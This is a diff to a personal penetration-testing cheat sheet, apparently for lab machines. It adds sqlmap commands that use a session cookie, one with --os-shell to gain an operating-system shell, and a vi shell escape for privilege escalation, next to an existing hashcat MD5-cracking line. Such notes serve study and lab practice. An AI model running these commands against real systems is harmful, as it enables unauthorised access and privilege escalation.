@@ -5,6 +5,7 @@
 | ----- | ----------------- |
 | foxyproxy | Firefox addin for quickly changing proxy | 
 | Wappalyser | Firefox addin for analysing framworks used in a webpage |
+| Cookie-Editor | Get and edit cookies |
 
 ## Discovery
 
@@ -37,6 +38,19 @@ echo {hash} > hash
 the command below is for md5 only
 ```
 hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt 
+```
+### SQL Injection
+```
+sqlmap -u 'http://10.129.84.36/dashboard.php?search=any+query' -- cookie="PHPSESSID=ad7vcdbs7jf1dqiebiskdag5ej"
+sqlmap -u 'http://10.129.84.36/dashboard.php?search=any+query' --cookie="PHPSESSID=ad7vcdbs7jf1dqiebiskdag5ej" --os-shell
+```
+
+### Priviledge escalation
+#### vi
+```
+vi
+:set shell=/bin/sh
+:shell
 ```
 
 
